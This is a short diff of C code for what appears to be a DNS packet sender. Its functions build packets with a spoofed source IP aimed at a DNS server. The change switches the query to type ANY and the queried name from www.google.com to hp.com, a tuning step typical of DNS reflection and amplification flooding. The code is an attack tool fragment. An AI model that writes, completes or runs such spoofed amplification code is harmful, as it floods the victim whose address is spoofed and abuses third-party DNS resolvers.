@@ -16,8 +16,8 @@ void CreateDnsHeader(dh *dns){
 }
 
 void CreateQueryInfo(query *q){
-	q->dnsq_type = htons(1);
-	q->dnsq_class = htons(0x00ff);
+	q->dnsq_type = htons(0x00ff);
+	q->dnsq_class = htons(1);
 }
 
 void CreatePseudoHeader(ph *psheader, char* spoofip, char* dnsip){
@@ -59,23 +59,31 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	CreateDnsHeader(dnsheader);
 
 	dns_server = (unsigned char *)&dns_data[sizeof(dh)];
-	*dns_server++ = '\3';
-	*dns_server++ = 'w';
-	*dns_server++ = 'w';
-	*dns_server++ = 'w';
-	*dns_server++ = '\6';
-	*dns_server++ = 'g';
-	*dns_server++ = 'o';
-	*dns_server++ = 'o';
-	*dns_server++ = 'g';
-	*dns_server++ = 'l';
-	*dns_server++ = 'e';
+	// *dns_server++ = '\3';
+	// *dns_server++ = 'w';
+	// *dns_server++ = 'w';
+	// *dns_server++ = 'w';
+	// *dns_server++ = '\6';
+	// *dns_server++ = 'g';
+	// *dns_server++ = 'o';
+	// *dns_server++ = 'o';
+	// *dns_server++ = 'g';
+	// *dns_server++ = 'l';
+	// *dns_server++ = 'e';
+	// *dns_server++ = '\3';
+	// *dns_server++ = 'c';
+	// *dns_server++ = 'o';
+	// *dns_server++ = 'm';
+	// *dns_server++ = '\0';
+	*dns_server++ = '\2';
+	*dns_server++ = 'h';
+	*dns_server++ = 'p';
 	*dns_server++ = '\3';
 	*dns_server++ = 'c';
 	*dns_server++ = 'o';
 	*dns_server++ = 'm';
 	*dns_server++ = '\0';
-	int length = 20;
+	int length = 12;
 	query *Query = (query *)&dns_data[(sizeof(dnsheader) + length)];
 	CreateQueryInfo(Query);
 
